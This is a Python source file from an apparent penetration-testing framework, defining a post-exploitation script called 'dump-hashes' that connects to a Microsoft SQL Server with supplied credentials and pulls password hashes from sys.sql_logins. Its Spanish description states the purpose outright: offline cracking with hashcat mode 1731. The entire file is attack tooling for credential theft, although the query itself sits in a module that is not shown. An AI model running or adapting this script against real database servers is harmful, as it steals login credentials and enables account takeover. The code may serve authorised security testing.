# scripts/mssql/post/dump_hashes.py
from scripts.base import BaseScript
from modules.mssql import MSSQLModule
from core.output import print_result

class Script(BaseScript):
    name        = "dump-hashes"
    protocol    = "mssql"
    category    = "post"
    description = "Extrae hashes de sys.sql_logins para cracking offline (hashcat -m 1731)."

    def run(self, **kwargs):
        port = int(kwargs.get("port") or 1433)
        mod  = MSSQLModule(self.target, self.creds)
        if not mod.connect(port=port):
            return None
        if not mod.login():
            mod.disconnect(); return None
        try:
            hashes = mod.dump_sql_hashes()
            if not hashes:
                print_result("MSSQL", self.target.ip, "fail",
                             "Sin hashes — requiere sysadmin o VIEW ANY DATABASE")
            return hashes
        finally:
            mod.disconnect()
